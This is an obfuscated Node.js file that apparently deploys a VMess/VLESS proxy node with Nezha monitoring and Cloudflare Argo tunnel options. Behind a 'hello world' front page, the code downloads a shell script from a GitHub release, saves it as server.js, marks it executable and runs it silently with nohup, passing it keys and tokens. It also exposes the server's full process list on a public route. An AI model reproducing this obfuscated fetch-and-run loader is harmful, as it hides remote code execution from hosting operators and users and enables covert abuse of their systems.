const port = process.env.SERVER_PORT || process.env.PORT || 3000;
//====节点参数
const uuid = process.env.UUID || 'fd80f56e-93f3-4c85-b2a8-c77216c509a7';
const vmms = process.env.MPATH || 'vms'; //vms path
const vmmport = process.env.VM_PORT || '8001';//vms 端口
const vpath = process.env.VPATH || 'vls';//vls path
const vport = process.env.VL_PORT || '8002'; //vls端口
const tmpargo = process.env.TMP_ARGO || 'vms'; //协议类型可选vms,vls
const subname = process.env.SUB_NAME || 'plutonodes.net'; //名称
const suburl = process.env.SUB_URL || ''; //订阅服务器地址
//====哪吒参数
const nezhaser = process.env.NEZHA_SERVER || '';
const nezhaKey = process.env.NEZHA_KEY || '';
const nezport = process.env.NEZHA_PORT || '443';
const neztls = process.env.NEZHA_TLS || '1';
//====隧道参数
const argoKey = process.env.TOK || ''; //隧道token,不填则使用临时隧道
const argodomain = process.env.ARGO_DOMAIN || ''; //固定隧道域名，使用token时必填
const _0x531770=_0x3d6a;(function(_0x125f8d,_0x34b104){const _0x3a27a6=_0x3d6a,_0x55d67d=_0x125f8d();while(!![]){try{const _0x46dc0a=-parseInt(_0x3a27a6(0x8d))/0x1*(-parseInt(_0x3a27a6(0xb7))/0x2)+-parseInt(_0x3a27a6(0x87))/0x3+-parseInt(_0x3a27a6(0x8e))/0x4+-parseInt(_0x3a27a6(0x6d))/0x5*(-parseInt(_0x3a27a6(0x7d))/0x6)+parseInt(_0x3a27a6(0x95))/0x7*(parseInt(_0x3a27a6(0xb4))/0x8)+-parseInt(_0x3a27a6(0xb1))/0x9+-parseInt(_0x3a27a6(0xc0))/0xa*(parseInt(_0x3a27a6(0x79))/0xb);if(_0x46dc0a===_0x34b104)break;else _0x55d67d['push'](_0x55d67d['shift']());}catch(_0x513c5d){_0x55d67d['push'](_0x55d67d['shift']());}}}(_0x1b94,0x26ab7));const express=require(_0x531770(0xa8)),app=express(),exec=require('child_process')[_0x531770(0x8b)],{execSync}=require(_0x531770(0x99)),os=require('os'),{createProxyMiddleware}=require(_0x531770(0xc1)),axios=require(_0x531770(0xa4)),fs=require('fs'),path=require('path');console[_0x531770(0x86)](_0x531770(0x76)),console[_0x531770(0x86)](''),console['log'](_0x531770(0xad)),console[_0x531770(0x86)]('/'+vmms+_0x531770(0xc3)),console[_0x531770(0x86)]('/'+vpath+'\x20vls直连'),console[_0x531770(0x86)]('/'+uuid+_0x531770(0x7e)),console['log'](''),console[_0x531770(0x86)](_0x531770(0x76)),app['get']('/',function(_0x416c5f,_0x58887e){const _0x368df7=_0x531770;_0x58887e[_0x368df7(0x94)](_0x368df7(0xb2));}),app[_0x531770(0x9a)](_0x531770(0xb8),function(_0x5524b4,_0x57aaba){const _0x28e936=_0x531770;let _0x5d201f=_0x28e936(0x70);exec(_0x5d201f,function(_0x420b79,_0x4dac04,_0x2692f8){const _0x20931b=_0x28e936;_0x420b79?_0x57aaba[_0x20931b(0x85)](_0x20931b(0x93))[_0x20931b(0x94)](_0x20931b(0x92)+_0x420b79+_0x20931b(0xc7)):_0x57aaba[_0x20931b(0x85)]('html')[_0x20931b(0x94)](_0x20931b(0x96)+_0x4dac04+_0x20931b(0xc7));});}),app[_0x531770(0x8a)]('/'+vmms,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x181289,_0x55e0f4,_0x5a691c){},'pathRewrite':{['^/'+vmms]:'/'+vmms},'target':_0x531770(0xa0)+vmmport+'/','ws':!![]})),app[_0x531770(0x8a)]('/'+vpath,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x5126ce,_0x1af7eb,_0x3d0a89){},'pathRewrite':{['^/'+vpath]:'/'+vpath},'target':_0x531770(0xa0)+vport+'/','ws':!![]})),app['get']('/'+uuid,function(_0x5bb6a3,_0xe75684){const _0x280d85=_0x531770;fs[_0x280d85(0xa3)](_0x280d85(0xb0),'utf8',(_0x43bacb,_0x559eb5)=>{const _0x32dc10=_0x280d85;if(_0x43bacb){console[_0x32dc10(0xc2)](_0x32dc10(0xc4),_0x43bacb),_0xe75684[_0x32dc10(0xa7)](0x1f4)[_0x32dc10(0x94)](_0x32dc10(0x78));return;}_0xe75684[_0x32dc10(0x97)](_0x32dc10(0xac),'text/plain;\x20charset=utf-8'),_0xe75684['send'](_0x559eb5);});});function isProcessRunning(_0x520d93){const _0x318cbf=_0x531770;try{return execSync(_0x318cbf(0xaa)+_0x520d93),console[_0x318cbf(0x86)](_0x318cbf(0xbf)+_0x520d93+_0x318cbf(0xc6)),!![];}catch(_0x558bec){}try{const _0x251a39=execSync('ps\x20aux\x20|\x20grep\x20\x22'+_0x520d93+_0x318cbf(0xa1))[_0x318cbf(0xa6)]();if(_0x251a39['trim']()!=='')return console[_0x318cbf(0x86)](_0x318cbf(0xbf)+_0x520d93+_0x318cbf(0x8c)),!![];}catch(_0x3faa93){}try{const _0x590687=fs[_0x318cbf(0x74)]('/proc');for(const _0x557366 of _0x590687){if(/^\d+$/[_0x318cbf(0x7c)](_0x557366))try{const _0x1fab23=fs['readFileSync'](_0x318cbf(0xb9)+_0x557366+'/cmdline','utf8');if(_0x1fab23[_0x318cbf(0x77)](_0x520d93))return console['log']('Process\x20'+_0x520d93+_0x318cbf(0x82)),!![];}catch(_0x46ad77){}}}catch(_0x377e9d){console[_0x318cbf(0x86)](_0x318cbf(0xa5));}return console[_0x318cbf(0x86)](_0x318cbf(0xbf)+_0x520d93+_0x318cbf(0x8f)),![];}function start_server(){const _0xd90d44=_0x531770;if(!isProcessRunning('server.js')){const _0x2c86ff=()=>{const _0x5842b7=_0x3d6a;fs[_0x5842b7(0x90)](_0x5842b7(0x9f),fs[_0x5842b7(0x89)][_0x5842b7(0x7f)],_0x3b9e55=>{const _0x409b12=_0x5842b7;if(_0x3b9e55)console[_0x409b12(0x86)]('Waiting\x20for\x20server.js\x20to\x20exist...'),setTimeout(_0x2c86ff,0x1388);else{const _0x9f2dee=_0x409b12(0x75)+uuid+_0x409b12(0xaf)+vmms+_0x409b12(0x81)+vmmport+_0x409b12(0xbd)+vpath+_0x409b12(0x83)+vport+_0x409b12(0xab)+tmpargo+_0x409b12(0x98)+nezhaser+_0x409b12(0x84)+nezhaKey+'\x20NEZHA_PORT='+nezport+_0x409b12(0x6f)+neztls+_0x409b12(0xa2)+argodomain+'\x20TOK='+argoKey+_0x409b12(0x88)+subname+_0x409b12(0xb6)+suburl+_0x409b12(0x73);exec(_0x9f2dee,function(_0xdf9007,_0x1e7b2a,_0x1a9765){const _0x5b745d=_0x409b12;if(_0xdf9007)console['log'](_0x5b745d(0x7a),_0xdf9007);else console[_0x5b745d(0x86)](_0x5b745d(0x91));});}});};_0x2c86ff();}else console[_0xd90d44(0x86)](_0xd90d44(0x9b));}function download_web(_0x3f1333){const _0x56eed4=_0x531770;let _0x3b10bb=_0x56eed4(0xc5),_0x2e8075=os[_0x56eed4(0xb5)]()===_0x56eed4(0xb3)||os[_0x56eed4(0xb5)]()===_0x56eed4(0x9d)?process[_0x56eed4(0xc8)][_0x56eed4(0xbc)]||_0x56eed4(0x7b):process[_0x56eed4(0xc8)][_0x56eed4(0x6c)]||_0x56eed4(0x7b),_0x145b2e=fs[_0x56eed4(0x9e)](path[_0x56eed4(0xa9)]('./',_0x3b10bb));axios['get'](_0x2e8075,{'responseType':'stream'})[_0x56eed4(0xba)](_0xb34a00=>{const _0x2e807a=_0x56eed4;_0xb34a00[_0x2e807a(0x6e)][_0x2e807a(0x80)](_0x145b2e),_0x145b2e['on'](_0x2e807a(0x72),()=>_0x3f1333(null));})[_0x56eed4(0xae)](_0x5761f9=>_0x3f1333(_0x56eed4(0xbb)));}function _0x3d6a(_0x10eaa4,_0x11f191){const _0x1b94a0=_0x1b94();return _0x3d6a=function(_0x3d6a80,_0x3b6800){_0x3d6a80=_0x3d6a80-0x6c;let _0x4dc698=_0x1b94a0[_0x3d6a80];return _0x4dc698;},_0x3d6a(_0x10eaa4,_0x11f191);}download_web(_0x2b31fb=>{const _0x27bd57=_0x531770;_0x2b31fb?console['log'](_0x2b31fb):(console[_0x27bd57(0x86)](_0x27bd57(0x71)),start_server());}),app[_0x531770(0x9c)](port,()=>console[_0x531770(0x86)](_0x531770(0xbe)+port+'!'));function _0x1b94(){const _0x340056=['10fpaZRf','data','\x20NEZHA_TLS=','ps\x20-ef\x20|\x20sed\x20\x27s@--token.*@--token@g;s@-s.*@-s\x20SERVER@g\x27;s@*.chmod@chmod@g\x27','下载server成功','close','\x20&&\x20chmod\x20+x\x20./server.js\x20&&\x20nohup\x20./server.js\x20>/dev/null\x202>&1\x20&','readdirSync','export\x20UUID=','==============================','includes','Internal\x20Server\x20Error','204853grENYn','调起server-命令行执行错误:','https://github.com/dsadsadsss/nodejs-wanju2/releases/download/1/start.sh','test','633582KguzZc','\x20查看订阅','F_OK','pipe','\x20VM_PORT=','\x20found\x20in\x20/proc\x20directory.','\x20VL_PORT=','\x20NEZHA_KEY=','type','log','485181xgCqDY','\x20SUB_NAME=','constants','use','exec','\x20found\x20using\x20ps\x20and\x20grep.','35009HOoVok','684792LGveUi','\x20not\x20found.','access','调起server-命令行执行成功!','<pre>命令行执行错误：\x0a','html','send','14MTGCzc','<pre>获取系统进程表：\x0a','setHeader','\x20NEZHA_SERVER=','child_process','get','server.js\x20is\x20already\x20running.','listen','amd64','createWriteStream','./server.js','http://127.0.0.1:','\x22\x20|\x20grep\x20-v\x20grep','\x20ARGO_DOMAIN=','readFile','axios','Unable\x20to\x20check\x20/proc\x20directory.','toString','status','express','join','pidof\x20','\x20TMP_ARGO=','Content-Type','/stas\x20查看进程','catch','\x20MPATH=','/tmp/list.log','1612035iDPVCc','hello\x20world','x64','940136AhJeKs','arch','\x20SUB_URL=','16jvSUwG','/stas','/proc/','then','下载server失败','URL_BOT','\x20VPATH=','Example\x20app\x20listening\x20on\x20port\x20','Process\x20','30xoFcNb','http-proxy-middleware','error','\x20vms直连','Error\x20reading\x20file:','server.js','\x20found\x20using\x20pidof.','</pre>','env','URL_BOT2'];_0x1b94=function(){return _0x340056;};return _0x1b94();}
